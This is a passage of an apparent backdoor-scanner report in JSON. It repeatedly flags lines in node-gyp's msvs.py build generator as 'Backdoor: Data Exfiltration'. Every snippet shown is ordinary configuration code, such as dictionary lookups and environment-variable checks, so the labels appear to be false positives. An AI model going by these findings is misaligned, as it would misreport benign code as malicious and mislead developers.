                    "text": "        target_name = prefix + product_name\n        msbuild_attributes[\"TargetName\"] = target_name\n    if \"TargetExt\" not in msbuild_attributes and \"product_extension\" in spec:\n        ext = spec.get(\"product_extension\")\n        msbuild_attributes[\"TargetExt\"] = \".\" + ext\n\n    if spec.get(\"msvs_external_builder\"):\n",
                    "rendered": {
                      "text": "        target_name = prefix + product_name\n        msbuild_attributes[\"TargetName\"] = target_name\n    if \"TargetExt\" not in msbuild_attributes and \"product_extension\" in spec:\n        ext = spec.get(\"product_extension\")\n        msbuild_attributes[\"TargetExt\"] = \".\" + ext\n\n    if spec.get(\"msvs_external_builder\"):\n",
                      "markdown": "`        target_name = prefix + product_name\n        msbuild_attributes[\"TargetName\"] = target_name\n    if \"TargetExt\" not in msbuild_attributes and \"product_extension\" in spec:\n        ext = spec.get(\"product_extension\")\n        msbuild_attributes[\"TargetExt\"] = \".\" + ext\n\n    if spec.get(\"msvs_external_builder\"):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3151,
                  "startColumn": 27,
                  "endLine": 3151,
                  "endColumn": 32,
                  "snippet": {
                    "text": "            )\n    if \"TargetName\" not in msbuild_attributes:\n        prefix = spec.get(\"product_prefix\", \"\")\n        product_name = spec.get(\"product_name\", \"$(ProjectName)\")\n        target_name = prefix + product_name\n        msbuild_attributes[\"TargetName\"] = target_name\n    if \"TargetExt\" not in msbuild_attributes and \"product_extension\" in spec:\n",
                    "rendered": {
                      "text": "            )\n    if \"TargetName\" not in msbuild_attributes:\n        prefix = spec.get(\"product_prefix\", \"\")\n        product_name = spec.get(\"product_name\", \"$(ProjectName)\")\n        target_name = prefix + product_name\n        msbuild_attributes[\"TargetName\"] = target_name\n    if \"TargetExt\" not in msbuild_attributes and \"product_extension\" in spec:\n",
                      "markdown": "`            )\n    if \"TargetName\" not in msbuild_attributes:\n        prefix = spec.get(\"product_prefix\", \"\")\n        product_name = spec.get(\"product_name\", \"$(ProjectName)\")\n        target_name = prefix + product_name\n        msbuild_attributes[\"TargetName\"] = target_name\n    if \"TargetExt\" not in msbuild_attributes and \"product_extension\" in spec:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3150,
                  "startColumn": 21,
                  "endLine": 3150,
                  "endColumn": 26,
                  "snippet": {
                    "text": "                msbuild_attributes[\"CharacterSet\"]\n            )\n    if \"TargetName\" not in msbuild_attributes:\n        prefix = spec.get(\"product_prefix\", \"\")\n        product_name = spec.get(\"product_name\", \"$(ProjectName)\")\n        target_name = prefix + product_name\n        msbuild_attributes[\"TargetName\"] = target_name\n",
                    "rendered": {
                      "text": "                msbuild_attributes[\"CharacterSet\"]\n            )\n    if \"TargetName\" not in msbuild_attributes:\n        prefix = spec.get(\"product_prefix\", \"\")\n        product_name = spec.get(\"product_name\", \"$(ProjectName)\")\n        target_name = prefix + product_name\n        msbuild_attributes[\"TargetName\"] = target_name\n",
                      "markdown": "`                msbuild_attributes[\"CharacterSet\"]\n            )\n    if \"TargetName\" not in msbuild_attributes:\n        prefix = spec.get(\"product_prefix\", \"\")\n        product_name = spec.get(\"product_name\", \"$(ProjectName)\")\n        target_name = prefix + product_name\n        msbuild_attributes[\"TargetName\"] = target_name\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3138,
                  "startColumn": 39,
                  "endLine": 3138,
                  "endColumn": 44,
                  "snippet": {
                    "text": "        config_type = _ConvertMSVSConfigurationType(config_type)\n        msbuild_attributes = config.get(\"msbuild_configuration_attributes\", {})\n        msbuild_attributes.setdefault(\"ConfigurationType\", config_type)\n        output_dir = msbuild_attributes.get(\n            \"OutputDirectory\", \"$(SolutionDir)$(Configuration)\"\n        )\n        msbuild_attributes[\"OutputDirectory\"] = _FixPath(output_dir) + \"\\\\\"\n",
                    "rendered": {
                      "text": "        config_type = _ConvertMSVSConfigurationType(config_type)\n        msbuild_attributes = config.get(\"msbuild_configuration_attributes\", {})\n        msbuild_attributes.setdefault(\"ConfigurationType\", config_type)\n        output_dir = msbuild_attributes.get(\n            \"OutputDirectory\", \"$(SolutionDir)$(Configuration)\"\n        )\n        msbuild_attributes[\"OutputDirectory\"] = _FixPath(output_dir) + \"\\\\\"\n",
                      "markdown": "`        config_type = _ConvertMSVSConfigurationType(config_type)\n        msbuild_attributes = config.get(\"msbuild_configuration_attributes\", {})\n        msbuild_attributes.setdefault(\"ConfigurationType\", config_type)\n        output_dir = msbuild_attributes.get(\n            \"OutputDirectory\", \"$(SolutionDir)$(Configuration)\"\n        )\n        msbuild_attributes[\"OutputDirectory\"] = _FixPath(output_dir) + \"\\\\\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3136,
                  "startColumn": 35,
                  "endLine": 3136,
                  "endColumn": 40,
                  "snippet": {
                    "text": "    else:\n        config_type = _GetMSVSConfigurationType(spec, build_file)\n        config_type = _ConvertMSVSConfigurationType(config_type)\n        msbuild_attributes = config.get(\"msbuild_configuration_attributes\", {})\n        msbuild_attributes.setdefault(\"ConfigurationType\", config_type)\n        output_dir = msbuild_attributes.get(\n            \"OutputDirectory\", \"$(SolutionDir)$(Configuration)\"\n",
                    "rendered": {
                      "text": "    else:\n        config_type = _GetMSVSConfigurationType(spec, build_file)\n        config_type = _ConvertMSVSConfigurationType(config_type)\n        msbuild_attributes = config.get(\"msbuild_configuration_attributes\", {})\n        msbuild_attributes.setdefault(\"ConfigurationType\", config_type)\n        output_dir = msbuild_attributes.get(\n            \"OutputDirectory\", \"$(SolutionDir)$(Configuration)\"\n",
                      "markdown": "`    else:\n        config_type = _GetMSVSConfigurationType(spec, build_file)\n        config_type = _ConvertMSVSConfigurationType(config_type)\n        msbuild_attributes = config.get(\"msbuild_configuration_attributes\", {})\n        msbuild_attributes.setdefault(\"ConfigurationType\", config_type)\n        output_dir = msbuild_attributes.get(\n            \"OutputDirectory\", \"$(SolutionDir)$(Configuration)\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3006,
                  "startColumn": 47,
                  "endLine": 3006,
                  "endColumn": 52,
                  "snippet": {
                    "text": "        vctools_version = msbuild_attributes.get(\"VCToolsVersion\")\n        config_type = msbuild_attributes.get(\"ConfigurationType\")\n        _AddConditionalProperty(properties, condition, \"ConfigurationType\", config_type)\n        spectre_mitigation = msbuild_attributes.get('SpectreMitigation')\n        if spectre_mitigation:\n            _AddConditionalProperty(properties, condition, \"SpectreMitigation\",\n                                    spectre_mitigation)\n",
                    "rendered": {
                      "text": "        vctools_version = msbuild_attributes.get(\"VCToolsVersion\")\n        config_type = msbuild_attributes.get(\"ConfigurationType\")\n        _AddConditionalProperty(properties, condition, \"ConfigurationType\", config_type)\n        spectre_mitigation = msbuild_attributes.get('SpectreMitigation')\n        if spectre_mitigation:\n            _AddConditionalProperty(properties, condition, \"SpectreMitigation\",\n                                    spectre_mitigation)\n",
                      "markdown": "`        vctools_version = msbuild_attributes.get(\"VCToolsVersion\")\n        config_type = msbuild_attributes.get(\"ConfigurationType\")\n        _AddConditionalProperty(properties, condition, \"ConfigurationType\", config_type)\n        spectre_mitigation = msbuild_attributes.get('SpectreMitigation')\n        if spectre_mitigation:\n            _AddConditionalProperty(properties, condition, \"SpectreMitigation\",\n                                    spectre_mitigation)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3004,
                  "startColumn": 40,
                  "endLine": 3004,
                  "endColumn": 45,
                  "snippet": {
                    "text": "        condition = _GetConfigurationCondition(name, settings, spec)\n        character_set = msbuild_attributes.get(\"CharacterSet\")\n        vctools_version = msbuild_attributes.get(\"VCToolsVersion\")\n        config_type = msbuild_attributes.get(\"ConfigurationType\")\n        _AddConditionalProperty(properties, condition, \"ConfigurationType\", config_type)\n        spectre_mitigation = msbuild_attributes.get('SpectreMitigation')\n        if spectre_mitigation:\n",
                    "rendered": {
                      "text": "        condition = _GetConfigurationCondition(name, settings, spec)\n        character_set = msbuild_attributes.get(\"CharacterSet\")\n        vctools_version = msbuild_attributes.get(\"VCToolsVersion\")\n        config_type = msbuild_attributes.get(\"ConfigurationType\")\n        _AddConditionalProperty(properties, condition, \"ConfigurationType\", config_type)\n        spectre_mitigation = msbuild_attributes.get('SpectreMitigation')\n        if spectre_mitigation:\n",
                      "markdown": "`        condition = _GetConfigurationCondition(name, settings, spec)\n        character_set = msbuild_attributes.get(\"CharacterSet\")\n        vctools_version = msbuild_attributes.get(\"VCToolsVersion\")\n        config_type = msbuild_attributes.get(\"ConfigurationType\")\n        _AddConditionalProperty(properties, condition, \"ConfigurationType\", config_type)\n        spectre_mitigation = msbuild_attributes.get('SpectreMitigation')\n        if spectre_mitigation:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3003,
                  "startColumn": 44,
                  "endLine": 3003,
                  "endColumn": 49,
                  "snippet": {
                    "text": "        msbuild_attributes = _GetMSBuildAttributes(spec, settings, build_file)\n        condition = _GetConfigurationCondition(name, settings, spec)\n        character_set = msbuild_attributes.get(\"CharacterSet\")\n        vctools_version = msbuild_attributes.get(\"VCToolsVersion\")\n        config_type = msbuild_attributes.get(\"ConfigurationType\")\n        _AddConditionalProperty(properties, condition, \"ConfigurationType\", config_type)\n        spectre_mitigation = msbuild_attributes.get('SpectreMitigation')\n",
                    "rendered": {
                      "text": "        msbuild_attributes = _GetMSBuildAttributes(spec, settings, build_file)\n        condition = _GetConfigurationCondition(name, settings, spec)\n        character_set = msbuild_attributes.get(\"CharacterSet\")\n        vctools_version = msbuild_attributes.get(\"VCToolsVersion\")\n        config_type = msbuild_attributes.get(\"ConfigurationType\")\n        _AddConditionalProperty(properties, condition, \"ConfigurationType\", config_type)\n        spectre_mitigation = msbuild_attributes.get('SpectreMitigation')\n",
                      "markdown": "`        msbuild_attributes = _GetMSBuildAttributes(spec, settings, build_file)\n        condition = _GetConfigurationCondition(name, settings, spec)\n        character_set = msbuild_attributes.get(\"CharacterSet\")\n        vctools_version = msbuild_attributes.get(\"VCToolsVersion\")\n        config_type = msbuild_attributes.get(\"ConfigurationType\")\n        _AddConditionalProperty(properties, condition, \"ConfigurationType\", config_type)\n        spectre_mitigation = msbuild_attributes.get('SpectreMitigation')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3002,
                  "startColumn": 42,
                  "endLine": 3002,
                  "endColumn": 47,
                  "snippet": {
                    "text": "    for name, settings in spec[\"configurations\"].items():\n        msbuild_attributes = _GetMSBuildAttributes(spec, settings, build_file)\n        condition = _GetConfigurationCondition(name, settings, spec)\n        character_set = msbuild_attributes.get(\"CharacterSet\")\n        vctools_version = msbuild_attributes.get(\"VCToolsVersion\")\n        config_type = msbuild_attributes.get(\"ConfigurationType\")\n        _AddConditionalProperty(properties, condition, \"ConfigurationType\", config_type)\n",
                    "rendered": {
                      "text": "    for name, settings in spec[\"configurations\"].items():\n        msbuild_attributes = _GetMSBuildAttributes(spec, settings, build_file)\n        condition = _GetConfigurationCondition(name, settings, spec)\n        character_set = msbuild_attributes.get(\"CharacterSet\")\n        vctools_version = msbuild_attributes.get(\"VCToolsVersion\")\n        config_type = msbuild_attributes.get(\"ConfigurationType\")\n        _AddConditionalProperty(properties, condition, \"ConfigurationType\", config_type)\n",
                      "markdown": "`    for name, settings in spec[\"configurations\"].items():\n        msbuild_attributes = _GetMSBuildAttributes(spec, settings, build_file)\n        condition = _GetConfigurationCondition(name, settings, spec)\n        character_set = msbuild_attributes.get(\"CharacterSet\")\n        vctools_version = msbuild_attributes.get(\"VCToolsVersion\")\n        config_type = msbuild_attributes.get(\"ConfigurationType\")\n        _AddConditionalProperty(properties, condition, \"ConfigurationType\", config_type)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2966,
                  "startColumn": 15,
                  "endLine": 2966,
                  "endColumn": 20,
                  "snippet": {
                    "text": "            properties[0].append([\"ApplicationTypeRevision\", app_type_revision])\n        else:\n            properties[0].append([\"ApplicationTypeRevision\", \"8.1\"])\n        if spec.get(\"msvs_enable_winphone\"):\n            properties[0].append([\"ApplicationType\", \"Windows Phone\"])\n        else:\n            properties[0].append([\"ApplicationType\", \"Windows Store\"])\n",
                    "rendered": {
                      "text": "            properties[0].append([\"ApplicationTypeRevision\", app_type_revision])\n        else:\n            properties[0].append([\"ApplicationTypeRevision\", \"8.1\"])\n        if spec.get(\"msvs_enable_winphone\"):\n            properties[0].append([\"ApplicationType\", \"Windows Phone\"])\n        else:\n            properties[0].append([\"ApplicationType\", \"Windows Store\"])\n",
                      "markdown": "`            properties[0].append([\"ApplicationTypeRevision\", app_type_revision])\n        else:\n            properties[0].append([\"ApplicationTypeRevision\", \"8.1\"])\n        if spec.get(\"msvs_enable_winphone\"):\n            properties[0].append([\"ApplicationType\", \"Windows Phone\"])\n        else:\n            properties[0].append([\"ApplicationType\", \"Windows Store\"])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2962,
                  "startColumn": 36,
                  "endLine": 2962,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        properties[0].append([\"DefaultLanguage\", \"en-US\"])\n        properties[0].append([\"AppContainerApplication\", \"true\"])\n        if spec.get(\"msvs_application_type_revision\"):\n            app_type_revision = spec.get(\"msvs_application_type_revision\")\n            properties[0].append([\"ApplicationTypeRevision\", app_type_revision])\n        else:\n            properties[0].append([\"ApplicationTypeRevision\", \"8.1\"])\n",
                    "rendered": {
                      "text": "        properties[0].append([\"DefaultLanguage\", \"en-US\"])\n        properties[0].append([\"AppContainerApplication\", \"true\"])\n        if spec.get(\"msvs_application_type_revision\"):\n            app_type_revision = spec.get(\"msvs_application_type_revision\")\n            properties[0].append([\"ApplicationTypeRevision\", app_type_revision])\n        else:\n            properties[0].append([\"ApplicationTypeRevision\", \"8.1\"])\n",
                      "markdown": "`        properties[0].append([\"DefaultLanguage\", \"en-US\"])\n        properties[0].append([\"AppContainerApplication\", \"true\"])\n        if spec.get(\"msvs_application_type_revision\"):\n            app_type_revision = spec.get(\"msvs_application_type_revision\")\n            properties[0].append([\"ApplicationTypeRevision\", app_type_revision])\n        else:\n            properties[0].append([\"ApplicationTypeRevision\", \"8.1\"])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2961,
                  "startColumn": 15,
                  "endLine": 2961,
                  "endColumn": 20,
                  "snippet": {
                    "text": "    if spec.get(\"msvs_enable_winrt\"):\n        properties[0].append([\"DefaultLanguage\", \"en-US\"])\n        properties[0].append([\"AppContainerApplication\", \"true\"])\n        if spec.get(\"msvs_application_type_revision\"):\n            app_type_revision = spec.get(\"msvs_application_type_revision\")\n            properties[0].append([\"ApplicationTypeRevision\", app_type_revision])\n        else:\n",
                    "rendered": {
                      "text": "    if spec.get(\"msvs_enable_winrt\"):\n        properties[0].append([\"DefaultLanguage\", \"en-US\"])\n        properties[0].append([\"AppContainerApplication\", \"true\"])\n        if spec.get(\"msvs_application_type_revision\"):\n            app_type_revision = spec.get(\"msvs_application_type_revision\")\n            properties[0].append([\"ApplicationTypeRevision\", app_type_revision])\n        else:\n",
                      "markdown": "`    if spec.get(\"msvs_enable_winrt\"):\n        properties[0].append([\"DefaultLanguage\", \"en-US\"])\n        properties[0].append([\"AppContainerApplication\", \"true\"])\n        if spec.get(\"msvs_application_type_revision\"):\n            app_type_revision = spec.get(\"msvs_application_type_revision\")\n            properties[0].append([\"ApplicationTypeRevision\", app_type_revision])\n        else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2958,
                  "startColumn": 11,
                  "endLine": 2958,
                  "endColumn": 16,
                  "snippet": {
                    "text": "                [\"WindowsTargetPlatformMinVersion\", target_platform_version]\n            )\n\n    if spec.get(\"msvs_enable_winrt\"):\n        properties[0].append([\"DefaultLanguage\", \"en-US\"])\n        properties[0].append([\"AppContainerApplication\", \"true\"])\n        if spec.get(\"msvs_application_type_revision\"):\n",
                    "rendered": {
                      "text": "                [\"WindowsTargetPlatformMinVersion\", target_platform_version]\n            )\n\n    if spec.get(\"msvs_enable_winrt\"):\n        properties[0].append([\"DefaultLanguage\", \"en-US\"])\n        properties[0].append([\"AppContainerApplication\", \"true\"])\n        if spec.get(\"msvs_application_type_revision\"):\n",
                      "markdown": "`                [\"WindowsTargetPlatformMinVersion\", target_platform_version]\n            )\n\n    if spec.get(\"msvs_enable_winrt\"):\n        properties[0].append([\"DefaultLanguage\", \"en-US\"])\n        properties[0].append([\"AppContainerApplication\", \"true\"])\n        if spec.get(\"msvs_application_type_revision\"):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2949,
                  "startColumn": 45,
                  "endLine": 2949,
                  "endColumn": 50,
                  "snippet": {
                    "text": "        target_platform_version = spec.get(\"msvs_target_platform_version\")\n        properties[0].append([\"WindowsTargetPlatformVersion\", target_platform_version])\n        if spec.get(\"msvs_target_platform_minversion\"):\n            target_platform_minversion = spec.get(\"msvs_target_platform_minversion\")\n            properties[0].append(\n                [\"WindowsTargetPlatformMinVersion\", target_platform_minversion]\n            )\n",
                    "rendered": {
                      "text": "        target_platform_version = spec.get(\"msvs_target_platform_version\")\n        properties[0].append([\"WindowsTargetPlatformVersion\", target_platform_version])\n        if spec.get(\"msvs_target_platform_minversion\"):\n            target_platform_minversion = spec.get(\"msvs_target_platform_minversion\")\n            properties[0].append(\n                [\"WindowsTargetPlatformMinVersion\", target_platform_minversion]\n            )\n",
                      "markdown": "`        target_platform_version = spec.get(\"msvs_target_platform_version\")\n        properties[0].append([\"WindowsTargetPlatformVersion\", target_platform_version])\n        if spec.get(\"msvs_target_platform_minversion\"):\n            target_platform_minversion = spec.get(\"msvs_target_platform_minversion\")\n            properties[0].append(\n                [\"WindowsTargetPlatformMinVersion\", target_platform_minversion]\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2948,
                  "startColumn": 15,
                  "endLine": 2948,
                  "endColumn": 20,
                  "snippet": {
                    "text": "    if spec.get(\"msvs_target_platform_version\"):\n        target_platform_version = spec.get(\"msvs_target_platform_version\")\n        properties[0].append([\"WindowsTargetPlatformVersion\", target_platform_version])\n        if spec.get(\"msvs_target_platform_minversion\"):\n            target_platform_minversion = spec.get(\"msvs_target_platform_minversion\")\n            properties[0].append(\n                [\"WindowsTargetPlatformMinVersion\", target_platform_minversion]\n",
                    "rendered": {
                      "text": "    if spec.get(\"msvs_target_platform_version\"):\n        target_platform_version = spec.get(\"msvs_target_platform_version\")\n        properties[0].append([\"WindowsTargetPlatformVersion\", target_platform_version])\n        if spec.get(\"msvs_target_platform_minversion\"):\n            target_platform_minversion = spec.get(\"msvs_target_platform_minversion\")\n            properties[0].append(\n                [\"WindowsTargetPlatformMinVersion\", target_platform_minversion]\n",
                      "markdown": "`    if spec.get(\"msvs_target_platform_version\"):\n        target_platform_version = spec.get(\"msvs_target_platform_version\")\n        properties[0].append([\"WindowsTargetPlatformVersion\", target_platform_version])\n        if spec.get(\"msvs_target_platform_minversion\"):\n            target_platform_minversion = spec.get(\"msvs_target_platform_minversion\")\n            properties[0].append(\n                [\"WindowsTargetPlatformMinVersion\", target_platform_minversion]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2946,
                  "startColumn": 38,
                  "endLine": 2946,
                  "endColumn": 43,
                  "snippet": {
                    "text": "        properties[0].append([\"PreferredToolArchitecture\", \"x64\"])\n\n    if spec.get(\"msvs_target_platform_version\"):\n        target_platform_version = spec.get(\"msvs_target_platform_version\")\n        properties[0].append([\"WindowsTargetPlatformVersion\", target_platform_version])\n        if spec.get(\"msvs_target_platform_minversion\"):\n            target_platform_minversion = spec.get(\"msvs_target_platform_minversion\")\n",
                    "rendered": {
                      "text": "        properties[0].append([\"PreferredToolArchitecture\", \"x64\"])\n\n    if spec.get(\"msvs_target_platform_version\"):\n        target_platform_version = spec.get(\"msvs_target_platform_version\")\n        properties[0].append([\"WindowsTargetPlatformVersion\", target_platform_version])\n        if spec.get(\"msvs_target_platform_minversion\"):\n            target_platform_minversion = spec.get(\"msvs_target_platform_minversion\")\n",
                      "markdown": "`        properties[0].append([\"PreferredToolArchitecture\", \"x64\"])\n\n    if spec.get(\"msvs_target_platform_version\"):\n        target_platform_version = spec.get(\"msvs_target_platform_version\")\n        properties[0].append([\"WindowsTargetPlatformVersion\", target_platform_version])\n        if spec.get(\"msvs_target_platform_minversion\"):\n            target_platform_minversion = spec.get(\"msvs_target_platform_minversion\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2945,
                  "startColumn": 11,
                  "endLine": 2945,
                  "endColumn": 16,
                  "snippet": {
                    "text": "    ):\n        properties[0].append([\"PreferredToolArchitecture\", \"x64\"])\n\n    if spec.get(\"msvs_target_platform_version\"):\n        target_platform_version = spec.get(\"msvs_target_platform_version\")\n        properties[0].append([\"WindowsTargetPlatformVersion\", target_platform_version])\n        if spec.get(\"msvs_target_platform_minversion\"):\n",
                    "rendered": {
                      "text": "    ):\n        properties[0].append([\"PreferredToolArchitecture\", \"x64\"])\n\n    if spec.get(\"msvs_target_platform_version\"):\n        target_platform_version = spec.get(\"msvs_target_platform_version\")\n        properties[0].append([\"WindowsTargetPlatformVersion\", target_platform_version])\n        if spec.get(\"msvs_target_platform_minversion\"):\n",
                      "markdown": "`    ):\n        properties[0].append([\"PreferredToolArchitecture\", \"x64\"])\n\n    if spec.get(\"msvs_target_platform_version\"):\n        target_platform_version = spec.get(\"msvs_target_platform_version\")\n        properties[0].append([\"WindowsTargetPlatformVersion\", target_platform_version])\n        if spec.get(\"msvs_target_platform_minversion\"):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2941,
                  "startColumn": 21,
                  "endLine": 2941,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n    ):\n        properties[0].append([\"PreferredToolArchitecture\", \"x64\"])\n\n",
                    "rendered": {
                      "text": "\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n    ):\n        properties[0].append([\"PreferredToolArchitecture\", \"x64\"])\n\n",
